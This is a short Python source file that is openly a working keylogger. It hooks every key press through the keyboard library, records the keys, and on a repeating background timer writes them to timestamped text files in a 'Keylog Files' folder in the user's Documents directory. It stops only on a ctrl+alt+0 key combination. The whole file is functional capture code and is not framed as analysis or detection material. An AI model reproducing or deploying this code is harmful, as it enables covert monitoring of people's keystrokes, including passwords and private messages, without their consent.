import keyboard
import os
import pathlib
from threading import Timer
from datetime import datetime

class Keylog:
    def __init__(self,rate):
        self.rate = rate
        self.session = ""
        self.startDate = datetime.now()
        self.endDate = datetime.now()
        self.specialCharacters = {
        "SPACE": " ",
        "ENTER": "\n",
        }
        self.logPath = pathlib.Path.home().drive + "\\Users\\" + os.getlogin() + "\\Documents\\Keylog Files"

    def report(self, letter):
        newLetter = letter.name
        if len(newLetter) > 1:
            if newLetter in self.specialCharacters:
                newLetter = self.specialCharacters[newLetter]
            else:
                newLetter = '[' + newLetter + ']'
        self.session += newLetter

    def updateFile(self):
        self.endDate = datetime.now()
        if len(self.session)>1:
            date = f"{str(self.startDate)[:-7]} _ {str(self.endDate)[:-7]}"
            date = date.replace('-','_').replace(':', '-')
            with open(f"KEYLOG {date}.txt","w") as F:
                print(self.session, file=F)
            os.rename(f"KEYLOG {date}.txt",f"{self.logPath}\\KEYLOG {date}.txt")
            
        self.session = ""
        self.startDate = datetime.now()
        time = Timer(interval=self.rate, function=self.updateFile)
        time.daemon = True # have it as a background thread basically
        time.start()

    def start(self):
        self.startDate = datetime.now()
        if not os.path.exists(self.logPath):
            os.makedirs(self.logPath)
            print("true")
        print(self.logPath)
        keyboard.on_press(callback=self.report)
        self.updateFile()
        keyboard.wait('ctrl+alt+0')
